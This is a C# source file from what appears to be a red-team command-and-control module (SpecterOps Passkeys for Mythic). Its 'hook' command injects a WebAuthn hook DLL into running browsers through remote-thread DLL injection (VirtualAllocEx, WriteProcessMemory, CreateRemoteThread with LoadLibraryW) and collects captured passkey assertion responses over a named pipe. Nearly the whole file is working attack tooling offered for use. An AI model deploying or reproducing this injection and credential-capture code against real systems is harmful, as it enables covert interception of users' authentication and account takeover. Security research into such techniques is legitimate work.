using System.CommandLine;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Logging;
using Microsoft.Win32.SafeHandles;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.System.Memory;
using Windows.Win32.System.SystemInformation;
using Windows.Win32.System.Threading;

namespace SpecterOps.Passkeys.Mythic;

/// <summary>
/// Defines the <c>hook</c> subcommand tree for loading and unloading the native WebAuthn hook DLL
/// into running browser processes.
/// </summary>
internal static class HookCommand
{
    /// <summary>Module file name of the Windows WebAuthn client library whose exports the hook detours.</summary>
    private const string WebAuthnModuleName = "webauthn.dll";

    /// <summary>Common file-name prefix of the architecture-specific hook DLLs (e.g., <c>WebAuthnHook_x64.dll</c>).</summary>
    private const string HookModulePrefix = "WebAuthnHook_";

    /// <summary>Name of the local named pipe that the hook DLL writes assertion responses to.</summary>
    private const string HookPipeName = "WebAuthnHook";

    /// <summary>Default timeout for <c>hook wait</c>.</summary>
    private static readonly TimeSpan DefaultHookWaitTimeout = TimeSpan.FromMinutes(10);

    /// <summary>Maximum number of remote <c>FreeLibrary</c> calls issued to decrement the hook's load count.</summary>
    private const int MaxUnloadAttempts = 8;

    /// <summary>
    /// Process names that can trigger Windows WebAuthn and are therefore candidates for injection.
    /// </summary>
    private static readonly string[] BrowserProcessNames =
    {
        "msedge",  // Microsoft Edge
        "chrome",  // Google Chrome
        "firefox", // Mozilla Firefox
        "brave",   // Brave
        "opera",   // Opera
        "vivaldi"  // Vivaldi
    };

    /// <summary>
    /// Captured information about a single browser process.
    /// </summary>
    private sealed record BrowserProcessInfo(int Pid, string Name, bool HasMainWindow, bool HasWebAuthn, bool HasHook);

    /// <summary>
    /// Creates the <c>hook</c> command with <c>attach</c>, <c>detach</c>, and <c>list</c> subcommands.
    /// </summary>
    public static Command Create(ILogger logger)
    {
        var attachPidOption = new Option<int?>("--pid", "-p")
        {
            Description = "Specific process ID to inject into."
        };
        var attachNameOption = new Option<string?>("--process-name", "--name", "-n")
        {
            Description = "Browser process name to target (e.g., msedge, chrome). Defaults to all known browsers."
        };
        var attachDllOption = new Option<string?>("--dll")
        {
            Description = "Explicit path to the hook DLL. When omitted, the architecture-matching WebAuthnHook_*.dll next to the CLI is used."
        };
        var attachCommand = new Command("attach", "Load the native WebAuthn hook DLL into a running browser process.")
        {
            attachPidOption,
            attachNameOption,
            attachDllOption
        };
        attachCommand.SetAction(parseResult => Attach(
            parseResult.GetValue(attachPidOption),
            parseResult.GetValue(attachNameOption),
            parseResult.GetValue(attachDllOption),
            logger));

        var detachPidOption = new Option<int?>("--pid", "-p")
        {
            Description = "Specific process ID to unload the hook from."
        };
        var detachNameOption = new Option<string?>("--process-name", "--name", "-n")
        {
            Description = "Browser process name to target. Defaults to all known browsers."
        };
        var detachCommand = new Command("detach", "Unload the native WebAuthn hook DLL from a running browser process.")
        {
            detachPidOption,
            detachNameOption
        };
        detachCommand.SetAction(parseResult => Detach(
            parseResult.GetValue(detachPidOption),
            parseResult.GetValue(detachNameOption),
            logger));

        var listCommand = new Command("list", "List running browser processes and the state of the native WebAuthn hook.");
        listCommand.SetAction(_ => ListBrowsers(logger));

        var waitTimeoutOption = new Option<int?>("--timeout", "-t")
        {
            Description = $"Timeout in seconds (default: {DefaultHookWaitTimeout.TotalSeconds:0})"
        };
        var waitCountOption = new Option<int?>("--count", "-n")
        {
            Description = "Maximum number of assertions to capture (default: unlimited)"
        };
        var waitCommand = new Command("wait", "Create the WebAuthnHook named pipe and listen for assertion responses from the hook DLL.")
        {
            waitTimeoutOption,
            waitCountOption
        };
        waitCommand.SetAction(parseResult =>
        {
            int? timeoutSeconds = parseResult.GetValue(waitTimeoutOption);
            TimeSpan timeout = timeoutSeconds.HasValue
                ? TimeSpan.FromSeconds(timeoutSeconds.Value)
                : DefaultHookWaitTimeout;
            int maxCount = parseResult.GetValue(waitCountOption) ?? 0;
            return WaitForHookResponses(logger, timeout, maxCount);
        });

        return new Command("hook", "Manage the native WebAuthn hook DLL in browser processes.")
        {
            attachCommand,
            detachCommand,
            listCommand,
            waitCommand
        };
    }

    /// <summary>
    /// Creates the <c>WebAuthnHook</c> named pipe and blocks until the hook DLL sends an assertion response
    /// (or the timeout/count limit is reached), printing each JSON response to stdout.
    /// </summary>
    /// <returns>0 if at least one assertion was captured; 1 on timeout with no captures.</returns>
    private static int WaitForHookResponses(ILogger logger, TimeSpan timeout, int maxCount)
    {
        PipeSecurity security = CreateAuthenticatedUsersPipeSecurity();

        NamedPipeServerStream pipe;
        try
        {
            pipe = new NamedPipeServerStream(
                HookPipeName,
                PipeDirection.In,
                maxNumberOfServerInstances: 1,
                PipeTransmissionMode.Message,
                PipeOptions.None,
                inBufferSize: 0,
                outBufferSize: 0,
                security);
        }
        catch (IOException ex)
        {
            logger.LogError("Failed to create named pipe \\\\.\\pipe\\{Name}: {Message}", HookPipeName, ex.Message);
            return 1;
        }

        using (pipe)
        {
            logger.LogInformation(
                "Listening on \\\\.\\pipe\\{Name} for hook assertion responses (timeout: {Timeout:0}s, max: {Max})...",
                HookPipeName,
                timeout.TotalSeconds,
                maxCount <= 0 ? "unlimited" : maxCount.ToString(CultureInfo.InvariantCulture));

            var deadline = DateTime.UtcNow + timeout;
            int received = 0;

            while (maxCount <= 0 || received < maxCount)
            {
                TimeSpan remaining = deadline - DateTime.UtcNow;
                if (remaining <= TimeSpan.Zero)
                {
                    break;
                }

                using var cts = new CancellationTokenSource(remaining);
                try
                {
                    pipe.WaitForConnectionAsync(cts.Token).GetAwaiter().GetResult();
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (IOException ex)
                {
                    logger.LogError("Pipe error while waiting for connection: {Message}", ex.Message);
                    break;
                }

                try
                {
                    string? json = ProcessPipeMessages(pipe, logger);
                    if (json is not null)
                    {
                        received++;
                        Console.WriteLine(json);
                    }
                }
                finally
                {
                    pipe.Disconnect();
                }
            }

            if (received == 0)
            {
                logger.LogWarning("Timeout expired. No assertion responses were received from the hook.");
                return 1;
            }

            logger.LogInformation("Captured {Count} assertion response(s).", received);
            return 0;
        }
    }

    /// <summary>
    /// Reads and dispatches the two pipe messages that the hook DLL sends per assertion:
    /// an <see cref="AssertionStartedMessage"/> notification followed by either
    /// an <see cref="AssertionCompletedMessage"/> carrying the JSON assertion payload
    /// or an <see cref="AssertionErrorMessage"/> carrying the HRESULT.
    /// Unknown future message types are logged and skipped.
    /// </summary>
    /// <returns>
    /// The raw JSON assertion object from the <c>AssertionCompleted</c> message,
    /// or <c>null</c> if the session ended without a usable payload.
    /// </returns>
    private static string? ProcessPipeMessages(NamedPipeServerStream pipe, ILogger logger)
    {
        string? startedJson = ReadPipeMessage(pipe);
        if (startedJson is null)
        {
            logger.LogWarning("Pipe connection closed without receiving any message.");
            return null;
        }

        HookPipeMessage? started;
        try
        {
            started = JsonSerializer.Deserialize(startedJson, HookPipeMessageJsonContext.Default.HookPipeMessage);
        }
        catch (JsonException ex)
        {
            logger.LogWarning("Failed to parse 'AssertionStarted' pipe message: {Error}", ex.Message);
            return null;
        }

        if (started is not AssertionStartedMessage startedMsg)
        {
            logger.LogWarning("Expected 'AssertionStarted' pipe message; received: {Type}.", started?.GetType().Name);
            return null;
        }

        logger.LogInformation(
            "Assertion ceremony started: rpId={RpId} process={Process} (pid {Pid}) user={User}.",
            startedMsg.RpId ?? "(null)",
            startedMsg.ProcessName ?? "(null)",
            startedMsg.Pid,
            startedMsg.UserName ?? "(null)");

        string? resultJson = ReadPipeMessage(pipe);
        if (resultJson is null)
        {
            logger.LogWarning("Pipe connection closed before the assertion result was received.");
            return null;
        }

        HookPipeMessage? result;
        try
        {
            result = JsonSerializer.Deserialize(resultJson, HookPipeMessageJsonContext.Default.HookPipeMessage);
        }
        catch (JsonException ex)
        {
            logger.LogWarning("Failed to parse assertion result message: {Error}", ex.Message);
            return null;
        }

        switch (result)
        {
            case AssertionCompletedMessage completed:
                return completed.Payload.GetRawText();

            case AssertionErrorMessage error:
                logger.LogWarning("Hook reported assertion error HRESULT 0x{HResult:X8}.", error.HResult);
                return null;

            default:
                logger.LogWarning("Unrecognized pipe message type: {Type}; ignoring.", result?.GetType().Name);
                return null;
        }
    }

    /// <summary>
    /// Reads one complete pipe message from <paramref name="pipe"/> operating in
    /// <see cref="PipeTransmissionMode.Message"/> mode. Accumulates chunks until
    /// <see cref="PipeStream.IsMessageComplete"/> is <c>true</c>.
    /// </summary>
    /// <returns>The UTF-8 decoded message string, or <c>null</c> when the pipe is closed.</returns>
    private static string? ReadPipeMessage(NamedPipeServerStream pipe)
    {
        var accumulated = new MemoryStream();
        var chunk = new byte[4096];

        do
        {
            int read = pipe.Read(chunk, 0, chunk.Length);
            if (read == 0)
            {
                return null;
            }

            accumulated.Write(chunk, 0, read);
        }
        while (!pipe.IsMessageComplete);

        return Encoding.UTF8.GetString(accumulated.ToArray());
    }

    /// <summary>
    /// Builds a <see cref="PipeSecurity"/> descriptor that grants the built-in
    /// <em>Authenticated Users</em> group write access so that the hook DLL,
    /// running under any interactively logged-in account, can connect and deliver responses.
    /// </summary>
    private static PipeSecurity CreateAuthenticatedUsersPipeSecurity()
    {
        var security = new PipeSecurity();
        security.AddAccessRule(new PipeAccessRule(
            new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null),
            PipeAccessRights.ReadWrite,
            AccessControlType.Allow));
        return security;
    }

    /// <summary>
    /// Resolves target browser processes and injects the architecture-matching hook DLL via <c>CreateRemoteThread</c> + <c>LoadLibraryW</c>.
    /// </summary>
    /// <returns>0 if every targeted process was injected (or already hooked); 1 on any failure.</returns>
    private static int Attach(int? pid, string? processName, string? dllPath, ILogger logger)
    {
        if (pid.HasValue && !string.IsNullOrWhiteSpace(processName))
        {
            logger.LogError("Specify either --pid or --process-name, not both.");
            return 1;
        }

        var targets = ResolveTargets(pid, processName, requireWebAuthn: true, logger);
        if (targets.Count == 0)
        {
            return 1;
        }

        try
        {
            int failures = 0;
            foreach (var process in targets)
            {
                var resolvedDll = ResolveHookDllPath(process, dllPath, logger);
                if (resolvedDll is null)
                {
                    failures++;
                    continue;
                }

                if (!InjectIntoProcess(process, resolvedDll, logger))
                {
                    failures++;
                }
            }

            return failures == 0 ? 0 : 1;
        }
        finally
        {
            foreach (var process in targets)
            {
                process.Dispose();
            }
        }
    }

    /// <summary>
    /// Resolves target browser processes and unloads the hook DLL via remote <c>FreeLibrary</c> calls.
    /// </summary>
    /// <returns>0 if every targeted process was unloaded (or was not hooked); 1 on any failure.</returns>
    private static int Detach(int? pid, string? processName, ILogger logger)
    {
        if (pid.HasValue && !string.IsNullOrWhiteSpace(processName))
        {
            logger.LogError("Specify either --pid or --process-name, not both.");
            return 1;
        }

        var targets = ResolveTargets(pid, processName, requireWebAuthn: false, logger);
        if (targets.Count == 0)
        {
            return 1;
        }

        try
        {
            int failures = 0;
            foreach (var process in targets)
            {
                if (!UnloadFromProcess(process, logger))
                {
                    failures++;
                }
            }

            return failures == 0 ? 0 : 1;
        }
        finally
        {
            foreach (var process in targets)
            {
                process.Dispose();
            }
        }
    }

    /// <summary>
    /// Enumerates known browser processes and prints a table showing whether <c>webauthn.dll</c> and the hook DLL are loaded.
    /// Per browser, narrows the list to the most interesting instances: processes that own a visible window,
    /// else processes that have already loaded <c>webauthn.dll</c>, else every instance.
    /// </summary>
    private static int ListBrowsers(ILogger logger)
    {
        logger.LogInformation("Enumerating browser processes...");

        var rows = new List<BrowserProcessInfo>();

        // Chromium-based browsers spawn many helper/renderer/GPU children under the same image name.
        // Listing every one clutters the output, so per-browser we pick the most useful slice:
        //   1. Any process that owns a visible top-level window (the "main" UX process).
        //   2. Else any process that has already loaded webauthn.dll (seen a passkey operation).
        //   3. Else every instance, so at least something is reported.
        foreach (var browserName in BrowserProcessNames)
        {
            Process[] processes = Process.GetProcessesByName(browserName);
            try
            {
                // Snapshot the window / webauthn / hook state for each process in one pass so the
                // selection logic below can reference the same values without re-querying.
                var candidates = new List<BrowserProcessInfo>(processes.Length);
                foreach (Process process in processes)
                {
                    candidates.Add(new BrowserProcessInfo(
                        process.Id,
                        process.ProcessName,
                        HasMainWindow(process),
                        HasModuleLoaded(process, WebAuthnModuleName),
                        TryGetHookModule(process, out _)));
                }

                // Narrow to the first tier that has any hits; fall through to "show everything" only
                // when both window-owning and webauthn-loaded subsets are empty.
                IEnumerable<BrowserProcessInfo> selected;
                if (candidates.Any(c => c.HasMainWindow))
                {
                    selected = candidates.Where(c => c.HasMainWindow);
                }
                else if (candidates.Any(c => c.HasWebAuthn))
                {
                    selected = candidates.Where(c => c.HasWebAuthn);
                }
                else
                {
                    selected = candidates;
                }

                rows.AddRange(selected);
            }
            finally
            {
                // Dispose every Process — both the ones we rendered and the ones filtered out.
                foreach (Process process in processes)
                {
                    process.Dispose();
                }
            }
        }

        if (rows.Count == 0)
        {
            logger.LogWarning("No browser processes were found.");
            return 0;
        }

        rows.Sort((left, right) =>
        {
            int byName = string.Compare(left.Name, right.Name, StringComparison.OrdinalIgnoreCase);
            return byName != 0 ? byName : left.Pid.CompareTo(right.Pid);
        });

        var table = new AsciiTable("PID", "Name", "Has Window", "WebAuthn Loaded", "Hook Loaded");
        foreach (BrowserProcessInfo row in rows)
        {
            table.AddRow(
                row.Pid.ToString(CultureInfo.InvariantCulture),
                row.Name,
                row.HasMainWindow ? "Yes" : "No",
                row.HasWebAuthn ? "Yes" : "No",
                row.HasHook ? "Yes" : "No");
        }

        table.Print(Console.Out);
        logger.LogInformation("Total browser processes found: {Count}", rows.Count);
        return 0;
    }

    /// <summary>
    /// Expands the user's <c>--pid</c> / <c>--process-name</c> selection into a list of live <see cref="Process"/> handles,
    /// optionally filtered to processes that currently have <c>webauthn.dll</c> loaded.
    /// </summary>
    /// <param name="requireWebAuthn">When <c>true</c>, drops processes that have not yet loaded <c>webauthn.dll</c>.</param>
    /// <returns>An empty list when no matching process is found; callers are responsible for disposing each returned process.</returns>
    private static List<Process> ResolveTargets(int? pid, string? processName, bool requireWebAuthn, ILogger logger)
    {
        if (pid.HasValue)
        {
            try
            {
                return new List<Process> { Process.GetProcessById(pid.Value) };
            }
            catch (ArgumentException)
            {
                logger.LogError("A process with pid {Pid} was not found.", pid.Value);
                return new List<Process>();
            }
        }

        IEnumerable<string> candidateNames = string.IsNullOrWhiteSpace(processName)
            ? BrowserProcessNames
            : new[] { NormalizeProcessName(processName!) };

        var results = new List<Process>();
        foreach (var name in candidateNames)
        {
            foreach (var process in Process.GetProcessesByName(name))
            {
                if (requireWebAuthn && !HasModuleLoaded(process, WebAuthnModuleName))
                {
                    process.Dispose();
                    continue;
                }

                results.Add(process);
            }
        }

        if (results.Count == 0)
        {
            if (requireWebAuthn)
            {
                logger.LogError("No browser process with {Module} loaded was found.", WebAuthnModuleName);
            }
            else
            {
                logger.LogError("No matching browser process was found.");
            }
        }

        return results;
    }

    /// <summary>
    /// Writes the hook DLL path into the target's address space and calls <c>LoadLibraryW</c> on it via a remote thread.
    /// </summary>
    /// <returns><c>true</c> when the hook is loaded (or was already loaded); <c>false</c> if any Win32 call failed.</returns>
    private static unsafe bool InjectIntoProcess(Process process, string dllPath, ILogger logger)
    {
        if (TryGetHookModule(process, out _))
        {
            logger.LogInformation("Skipping {Name} (pid {Pid}): hook is already loaded.", process.ProcessName, process.Id);
            return true;
        }

        var processHandle = PInvoke.OpenProcess(
            PROCESS_ACCESS_RIGHTS.PROCESS_CREATE_THREAD
            | PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_INFORMATION
            | PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION
            | PROCESS_ACCESS_RIGHTS.PROCESS_VM_WRITE
            | PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ,
            false,
            (uint)process.Id);

        if (processHandle.IsNull)
        {
            LogLastPInvokeError(logger, "OpenProcess", process.Id);
            return false;
        }

        try
        {
            var dllPathBytes = Encoding.Unicode.GetBytes(dllPath + '\0');
            fixed (byte* dllPathBytesPtr = dllPathBytes)
            {
                var remoteBuffer = PInvoke.VirtualAllocEx(
                    processHandle,
                    null,
                    (nuint)dllPathBytes.Length,
                    VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    PAGE_PROTECTION_FLAGS.PAGE_READWRITE);

                if (remoteBuffer is null)
                {
                    LogLastPInvokeError(logger, "VirtualAllocEx", process.Id);
                    return false;
                }

                try
                {
                    if (!PInvoke.WriteProcessMemory(processHandle, remoteBuffer, dllPathBytesPtr, (nuint)dllPathBytes.Length, null))
                    {
                        LogLastPInvokeError(logger, "WriteProcessMemory", process.Id);
                        return false;
                    }

                    if (!TryRunRemoteThread(
                        processHandle,
                        GetKernel32ExportAddress("LoadLibraryW"),
                        remoteBuffer,
                        "LoadLibraryW",
                        process.Id,
                        logger,
                        out _))
                    {
                        return false;
                    }
                }
                finally
                {
                    PInvoke.VirtualFreeEx(processHandle, remoteBuffer, 0, VIRTUAL_FREE_TYPE.MEM_RELEASE);
                }
            }
        }
        finally
        {
            PInvoke.CloseHandle(processHandle);
        }

        logger.LogInformation("Injected {Dll} into {Name} (pid {Pid}).", Path.GetFileName(dllPath), process.ProcessName, process.Id);
        return true;
    }

    /// <summary>
    /// Issues remote <c>FreeLibrary</c> calls against the hook module until its reference count drops to zero,
    /// giving up after <see cref="MaxUnloadAttempts"/> attempts.
    /// </summary>
    /// <returns><c>true</c> when the module is fully unloaded (or was not loaded); <c>false</c> if a call failed or the count never reached zero.</returns>
    private static unsafe bool UnloadFromProcess(Process process, ILogger logger)
    {
        if (!TryGetHookModule(process, out var hookModule))
        {
            logger.LogInformation("Skipping {Name} (pid {Pid}): hook is not loaded.", process.ProcessName, process.Id);
            return true;
        }

        var processHandle = PInvoke.OpenProcess(
            PROCESS_ACCESS_RIGHTS.PROCESS_CREATE_THREAD
            | PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_INFORMATION
            | PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION
            | PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ,
            false,
            (uint)process.Id);

        if (processHandle.IsNull)
        {
            LogLastPInvokeError(logger, "OpenProcess", process.Id);
            return false;
        }

        try
        {
            // Attach installs two detours (the assertion hook and optionally the LoadLibrary bootstraps),
            // so each FreeLibrary call only decrements one reference. Retry until the module is fully gone.
            for (int attempt = 0; attempt < MaxUnloadAttempts; attempt++)
            {
                if (!TryGetHookModule(process, out hookModule))
                {
                    logger.LogInformation("Unloaded hook from {Name} (pid {Pid}).", process.ProcessName, process.Id);
                    return true;
                }

                if (!TryRunRemoteThread(
                    processHandle,
                    GetKernel32ExportAddress("FreeLibrary"),
                    (void*)hookModule!.BaseAddress,
                    "FreeLibrary",
                    process.Id,
                    logger,
                    out _))
                {
                    return false;
                }
            }
        }
        finally
        {
            PInvoke.CloseHandle(processHandle);
        }

        logger.LogError("Unable to fully unload the hook from {Name} (pid {Pid}).", process.ProcessName, process.Id);
        return false;
    }

    /// <summary>
    /// Runs <paramref name="startAddress"/> as a remote thread inside the target process, waits for it to exit,
    /// and reports the 32-bit return value. A zero return is treated as failure because <c>LoadLibraryW</c> and
    /// <c>FreeLibrary</c> both return zero on error.
    /// </summary>
    private static unsafe bool TryRunRemoteThread(
        HANDLE processHandle,
        IntPtr startAddress,
        void* parameter,
        string routineName,
        int pid,
        ILogger logger,
        out uint exitCode)
    {
        exitCode = 0;
        using var processSafeHandle = new SafeFileHandle((IntPtr)processHandle.Value, ownsHandle: false);
        var startRoutine = Marshal.GetDelegateForFunctionPointer<LPTHREAD_START_ROUTINE>(startAddress);

        using var threadHandle = PInvoke.CreateRemoteThread(
            processSafeHandle,
            null,
            0,
            startRoutine,
            parameter,
            0,
            out _);

        if (threadHandle.IsInvalid)
        {
            LogLastPInvokeError(logger, "CreateRemoteThread", pid);
            return false;
        }

        PInvoke.WaitForSingleObject(threadHandle, PInvoke.INFINITE);
        if (!PInvoke.GetExitCodeThread(threadHandle, out exitCode))
        {
            LogLastPInvokeError(logger, "GetExitCodeThread", pid);
            return false;
        }

        if (exitCode == 0)
        {
            logger.LogError("Remote {Routine} returned 0 for pid {Pid}.", routineName, pid);
            return false;
        }

        return true;
    }

    /// <summary>
    /// Resolves the full path to the hook DLL matching the target process's architecture,
    /// using <paramref name="explicitPath"/> when provided, otherwise falling back to a co-located <c>WebAuthnHook_{arch}.dll</c>.
    /// </summary>
    /// <returns>The resolved DLL path, or <c>null</c> when no matching DLL can be located.</returns>
    private static string? ResolveHookDllPath(Process process, string? explicitPath, ILogger logger)
    {
        if (!string.IsNullOrWhiteSpace(explicitPath))
        {
            var fullPath = Path.GetFullPath(explicitPath!);
            if (File.Exists(fullPath))
            {
                return fullPath;
            }

            logger.LogError("Hook DLL not found at {Path}.", fullPath);
            return null;
        }

        var arch = DetectProcessArchitecture(process);
        var dllName = arch switch
        {
            Architecture.X64 => HookModulePrefix + "x64.dll",
            Architecture.X86 => HookModulePrefix + "x86.dll",
            Architecture.Arm64 => HookModulePrefix + "arm64.dll",
            _ => null
        };

        if (dllName is null)
        {
            logger.LogError("Unsupported or undetectable architecture for pid {Pid}.", process.Id);
            return null;
        }

        var baseDirectory = Path.GetDirectoryName(typeof(HookCommand).Assembly.Location) ?? string.Empty;
        var candidate = Path.Combine(baseDirectory, dllName);
        if (File.Exists(candidate))
        {
            return candidate;
        }

        logger.LogError("Hook DLL {Name} not found next to the CLI ({Directory}). Pass --dll explicitly.", dllName, baseDirectory);
        return null;
    }

    /// <summary>
    /// Uses <c>IsWow64Process2</c> to determine the effective architecture of <paramref name="process"/>,
    /// accounting for WoW64 (x86-on-x64) and WoW64-style x64-on-ARM64 emulation.
    /// </summary>
    /// <returns>The detected <see cref="Architecture"/>, or <c>null</c> if the value cannot be obtained or mapped.</returns>
    private static unsafe Architecture? DetectProcessArchitecture(Process process)
    {
        var handle = PInvoke.OpenProcess(PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)process.Id);
        if (handle.IsNull)
        {
            return null;
        }

        try
        {
            IMAGE_FILE_MACHINE processMachine;
            IMAGE_FILE_MACHINE nativeMachine;
            if (!PInvoke.IsWow64Process2(handle, &processMachine, &nativeMachine))
            {
                return null;
            }

            // IMAGE_FILE_MACHINE_UNKNOWN in processMachine means the target is running natively,
            // so the process architecture equals the host's native architecture.
            var machine = processMachine == IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_UNKNOWN
                ? nativeMachine
                : processMachine;

            return machine switch
            {
                IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_I386 => Architecture.X86,
                IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_AMD64 => Architecture.X64,
                IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_ARM64 => Architecture.Arm64,
                _ => (Architecture?)null
            };
        }
        finally
        {
            PInvoke.CloseHandle(handle);
        }
    }

    /// <summary>
    /// Returns the address of an exported function in <c>kernel32.dll</c> (already loaded at a fixed base
    /// in every Windows process), suitable as a remote thread start address.
    /// </summary>
    private static IntPtr GetKernel32ExportAddress(string exportName)
    {
        var kernel32 = PInvoke.GetModuleHandle("kernel32.dll");
        return (IntPtr)PInvoke.GetProcAddress(kernel32, exportName);
    }

    /// <summary>
    /// Returns <c>true</c> when <paramref name="process"/> owns a top-level window.
    /// Swallows <see cref="InvalidOperationException"/> if the process exits between enumeration and inspection.
    /// </summary>
    private static bool HasMainWindow(Process process)
    {
        try
        {
            return process.MainWindowHandle != IntPtr.Zero;
        }
        catch (InvalidOperationException)
        {
            return false;
        }
    }

    /// <summary>
    /// Checks whether <paramref name="process"/> currently has a module with the given file name loaded.
    /// Swallows access-denied and exited-process errors and reports them as "not loaded".
    /// </summary>
    private static bool HasModuleLoaded(Process process, string moduleName)
    {
        try
        {
            foreach (ProcessModule module in process.Modules)
            {
                if (string.Equals(module.ModuleName, moduleName, StringComparison.OrdinalIgnoreCase))
                {
                    return true;
                }
            }
        }
        catch
        {
            // Access denied or the process exited; treat as "not loaded" so callers fall back gracefully.
        }

        return false;
    }

    /// <summary>
    /// Locates any loaded module whose file name starts with <see cref="HookModulePrefix"/> (e.g., <c>WebAuthnHook_x64.dll</c>),
    /// so detach works regardless of which architecture variant was injected.
    /// </summary>
    /// <returns><c>true</c> and the matching module when found; otherwise <c>false</c>.</returns>
    private static bool TryGetHookModule(Process process, out ProcessModule? hookModule)
    {
        hookModule = null;

        try
        {
            foreach (ProcessModule module in process.Modules)
            {
                var name = module.ModuleName;
                if (!string.IsNullOrEmpty(name)
                    && name.StartsWith(HookModulePrefix, StringComparison.OrdinalIgnoreCase)
                    && name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                {
                    // Found a loaded module that matches the expected hook naming pattern; assume it's ours.
                    hookModule = module;
                    return true;
                }
            }
        }
        catch
        {
        }

        return false;
    }

    /// <summary>
    /// Logs the most recent Win32 error (retrieved via <see cref="Marshal.GetLastWin32Error"/>) together with its system message.
    /// </summary>
    private static void LogLastPInvokeError(ILogger logger, string operation, int pid)
    {
        int error = Marshal.GetLastWin32Error();
        logger.LogError(
            "{Operation} failed for pid {Pid} ({Code}: {Message}).",
            operation,
            pid,
            error,
            new Win32Exception(error).Message);
    }

    /// <summary>
    /// Strips a trailing <c>.exe</c> suffix so the value is compatible with <see cref="Process.GetProcessesByName(string)"/>.
    /// </summary>
    private static string NormalizeProcessName(string name)
    {
        return name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
            ? name.Substring(0, name.Length - 4)
            : name;
    }
}
